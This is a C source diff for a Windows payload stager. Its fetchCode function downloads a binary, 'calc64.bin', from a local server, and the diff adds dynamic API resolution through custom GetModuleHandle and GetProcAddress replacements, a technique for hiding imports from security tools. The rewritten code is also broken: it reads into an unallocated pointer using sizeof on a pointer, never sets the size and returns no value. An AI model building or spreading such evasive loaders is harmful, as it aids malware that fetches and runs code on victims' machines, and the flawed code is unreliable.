@@ -1,51 +1,44 @@
 #include <windows.h>
 #include <wininet.h>
-#include <stdlib.h>
+#include <stdio.h>
+
+#include "GetterFunctions.h"
+
+#pragma comment(lib, "wininet.lib")
+
+typedef HINTERNET(WINAPI* INTERNETOPEN)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
+typedef HINTERNET(WINAPI* INTERNETOPENURL)(HINTERNET, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD_PTR);
+typedef BOOL(WINAPI* LPInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
+typedef BOOL(WINAPI* LPInternetCloseHandle)(HINTERNET);
+
 
 int fetchCode(const wchar_t* hostname, const wchar_t* file, int port, unsigned char** buffer, DWORD* size) {
-    DWORD bytesRead = 0;
+// Get a handle to the DLL module
+    HMODULE hDll = GetModuleHandleReplacement(TEXT("wininet.dll"));
+    DWORD bytesRead;
     DWORD totalBytesRead = 0;
-    DWORD bufferSize = 4096; // initial buffer size
 
-    // Allocate buffer
-    *buffer = (unsigned char*)malloc(bufferSize);
-    if (*buffer == NULL) {
-        return -2; // Failed to allocate memory
-    }
+    // If the handle is valid, try to get the function address
+    if (hDll != NULL) {
+        INTERNETOPEN pInternetOpen = (INTERNETOPEN)GetProcAddressReplacement(hDll, "InternetOpenW");
+        INTERNETOPENURL pInternetOpenUrl = (INTERNETOPENURL)GetProcAddressReplacement(hDll, "InternetOpenUrlW");
+        LPInternetReadFile pInternetReadFile = (LPInternetReadFile)GetProcAddressReplacement(hDll, "InternetReadFile");
+        LPInternetCloseHandle pInternetCloseHandle = (LPInternetCloseHandle)GetProcAddressReplacement(hDll, "InternetCloseHandle");
 
-    HINTERNET hInternet = InternetOpen(L"User Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    if (hInternet == NULL) {
-        free(*buffer);
-        return -1;
-    }
-
-    HINTERNET hConnect = InternetOpenUrl(hInternet, "http://localhost:8000/calc64.bin", NULL, 0, INTERNET_FLAG_RELOAD, 0);
-    if (hConnect == NULL) {
-        DWORD error = GetLastError();
-        printf("InternetOpenUrl failed, error code = %lu\n", error);
-        InternetCloseHandle(hInternet);
-        free(*buffer);
-        return -3;
-    }
-
-
-    while (InternetReadFile(hConnect, *buffer + totalBytesRead, bufferSize - totalBytesRead, &bytesRead) && bytesRead > 0) {
-        totalBytesRead += bytesRead;
-        if (totalBytesRead == bufferSize) {
-            // Resize buffer
-            bufferSize *= 2;
-            *buffer = realloc(*buffer, bufferSize);
-            if (*buffer == NULL) {
-                InternetCloseHandle(hConnect);
+        if (pInternetOpen != NULL && pInternetOpenUrl != NULL && pInternetReadFile != NULL && pInternetCloseHandle != NULL) {
+            HINTERNET hInternet = pInternetOpen(L"User Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+            if (hInternet != NULL) {
+                HINTERNET hConnect = pInternetOpenUrl(hInternet, L"http://localhost:10000/calc64.bin", NULL, 0, INTERNET_FLAG_RELOAD, 0);
+                if (hConnect != NULL) {
+                    while (pInternetReadFile(hConnect, buffer + totalBytesRead, sizeof(buffer) - totalBytesRead, &bytesRead) && bytesRead > 0) {
+                        totalBytesRead += bytesRead;
+                    }
+                    // Close the connection handle
+                    InternetCloseHandle(hConnect);
+                }
+                // Close the hInternet handle
                 InternetCloseHandle(hInternet);
-                return -2; // Failed to allocate more memory
             }
         }
     }
-
-    InternetCloseHandle(hConnect);
-    InternetCloseHandle(hInternet);
-
-    *size = totalBytesRead;
-    return 0; // Success
 }
